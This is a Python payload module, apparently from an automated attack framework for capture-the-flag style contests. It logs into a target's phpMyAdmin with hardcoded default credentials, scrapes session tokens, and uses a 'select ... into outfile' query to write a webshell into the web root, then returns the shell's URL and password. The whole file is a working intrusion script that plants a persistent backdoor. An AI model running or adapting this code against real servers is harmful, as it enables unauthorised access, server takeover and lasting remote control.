'''
This is a default payload
if there is a backdoor in upload/upload.php,and key is pass
The real situation is much more complex
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from configuration import configuration
from utils import Utils
from bs4 import BeautifulSoup

proxies = {
    'http':'127.0.0.1:8080'
}

class P(Payload):
    def attack(self):
        username = 'admin'
        password = '1234567890'       
        try:
            # get token
            s = requests.Session()
            url = 'http://{}/phpMyAdmin/index.php'.format(self.host)
            res = s.get(url,timeout=2)
            soup = BeautifulSoup(res.text,'lxml')
            set_session = res.cookies.get('phpMyAdmin',None)
            tokens = soup.find_all('input',{'type':'hidden','name':'token'})
            if not tokens:
                raise PayloadFailException
            token = tokens[0].get('value')
            if not token:
                raise PayloadFailException
            # login
            # print(token)
            # print(set_session)
            res = s.post(url,data={
                'set_session':set_session,
                'pma_username':username,
                'pma_password':password,
                'server':1,
                'target':'index.php',
                'token':token
            },timeout=2)
            soup = BeautifulSoup(res.text,'lxml')
            tokens = soup.find_all('input',{'type':'hidden','name':'token'})
            if not tokens:
                raise PayloadFailException
            token = tokens[0].get('value')
            if not token:
                raise PayloadFailException
            # print(token)
            # select into outfile
            sqlUrl = 'http://{}/phpMyAdmin/import.php'.format(self.host)
            horse = Horse(self.host)
            res = s.post(sqlUrl,data={
                'token':token,
                'sql_query':"select \"{}\" into outfile '{}{}'".format(horse.simple,configuration.webRoot,configuration.shellLocations[0]),
                'ajax_request':'true',
                'ajax_page_request':'true'
            },timeout=2)
            # print(res.text)
            shellUrl = 'http://{}{}'.format(self.host,configuration.shellLocations[0])
            res = s.get(shellUrl,timeout=2)
            if res.status_code == 200:
                return shellUrl,Utils.getPassword(self.host)
        except Exception as e:
            # print(e)
            raise PayloadFailException
        raise PayloadFailException



